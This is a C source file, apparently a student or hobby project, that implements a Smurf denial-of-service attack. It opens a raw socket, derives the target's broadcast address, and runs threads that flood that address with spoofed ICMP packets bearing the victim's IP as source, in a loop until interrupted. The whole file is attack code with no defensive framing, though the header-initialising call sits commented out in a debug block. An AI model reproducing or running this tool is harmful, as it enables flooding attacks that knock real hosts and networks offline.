#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <string.h>
#include <netdb.h>
#include <errno.h>
#include <pthread.h>
#include "header/CRC16_check.h"
#include "header/init_header.h"
#include "header/pause.h"

/* 最多線程數 */
#define MAXCHILD 2

/* 原始套接字 */
int sockfd;

/* 程序活動標誌 */
static int alive = -1;

char dst_ip[20] = { 0 };
char brc_ip[20] = { 0 };

void getBroadcastIP(struct sockaddr_in *addr){
    // binary form 
    uint32_t dst_ip_b;
    inet_pton(AF_INET, dst_ip, &dst_ip_b);
    // & to get broadcast address x.x.x.255
    // little endian
    dst_ip_b = (dst_ip_b & 0x00FFFFFF) + 0xFF000000;
    inet_ntop(AF_INET, &dst_ip_b, brc_ip, sizeof(brc_ip));
}

void *attack(void *addr_info){
    struct sockaddr_in *addr = (struct sockaddr_in *)addr_info;

    char buf[100], sendbuf[100];   
    int len;
    struct iphdr ip_hdr;			//IP頭部
    struct tcphdr tcp_hdr;
    struct icmphdr icmp_hdr;


    // packet length
    len = sizeof(struct iphdr) + sizeof(struct icmphdr);


    //  ------------- DeBug-----------------------
    // icmp_init_header(&ip_hdr, &icmp_hdr, dst_ip, brc_ip);
    // char test_ip[20] = {0};
    // inet_ntop(AF_INET, &ip_hdr.saddr,test_ip, sizeof(test_ip));
    // printf("source IP = %s\n", test_ip);
    // Pause();
    // printf("packet ttl = %d\n", ip_hdr.ttl);
    // Pause();
    // ----------------------------------------------

    while(alive){
        // ip checksum
    	bzero(buf, sizeof(buf));
	    memcpy(buf, &ip_hdr, sizeof(struct iphdr));
	    ip_hdr.check = check_sum((u_short *) buf, sizeof(struct iphdr));

        // icmp checksum
	    bzero(buf, sizeof(buf));
	    memcpy(buf, &icmp_hdr, sizeof(struct icmphdr));
	    icmp_hdr.checksum = check_sum((u_short *) buf, sizeof(struct icmphdr));

        // send buffer -- [IP header][ICMP header]
	    bzero(sendbuf, sizeof(sendbuf));
	    memcpy(sendbuf, &ip_hdr, sizeof(struct iphdr));
	    memcpy(sendbuf+sizeof(struct iphdr), &icmp_hdr, sizeof(struct icmphdr));


	    if(sendto(sockfd, sendbuf, len, 0, (struct sockaddr *)addr, sizeof(struct sockaddr))<0){
		    perror("sendto()");
		    pthread_exit("fail");
	    }
        printf("Smurfing!!");
    }
}



/* 信號處理函數,設置退出變量alive */
void sig_int(int signo){
	alive = 0;
}

/* 主函數 */
int main(int argc, char *argv[]){
    struct sockaddr_in addr;
    struct hostent *host = NULL;

    int i = 0;
    pthread_t pthread[MAXCHILD];
    int err = -1;
    int broadcast_pings = 1;

    alive = 1;
    /* 截取信號CTRL+C */
    signal(SIGINT, sig_int);

    /* 参數是否數量正鴂 */
    if(argc < 2 || argc > 2){
	printf("usage: smurf <IPaddress>\n");
	exit(1);
    }

    strncpy( dst_ip, argv[1], 16 ); 

    bzero(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(0);

    getBroadcastIP(&addr);
    // printf("%s\n", brc_ip);
    // Pause();
    addr.sin_addr.s_addr = inet_addr(brc_ip);


    /* 建立原始socket */
    sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);	
    if (sockfd < 0){
 	perror("socket()");
	exit(1);
    }
    /* 設置IP選項 */
    if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, &broadcast_pings, sizeof(broadcast_pings)) < 0){
		perror("setsockopt()");
		exit(1);
	}  

	if(connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
	{
		perror("connect()");
		return(1);	
	}

	/* 將程序的權限修改為普通用户 */
	setuid(getpid());
	for(i=0; i<MAXCHILD; i++){
		err = pthread_create(&pthread[i], NULL, attack, (void *)&addr);
		if(err != 0){
			perror("pthread_create()");
			exit(1);
		}
	}


	for(i=0; i<MAXCHILD; i++){
		err = pthread_join(pthread[i], NULL);
		if(err != 0){
			perror("pthread_join Error\n");
			exit(1);
		}
	}

}
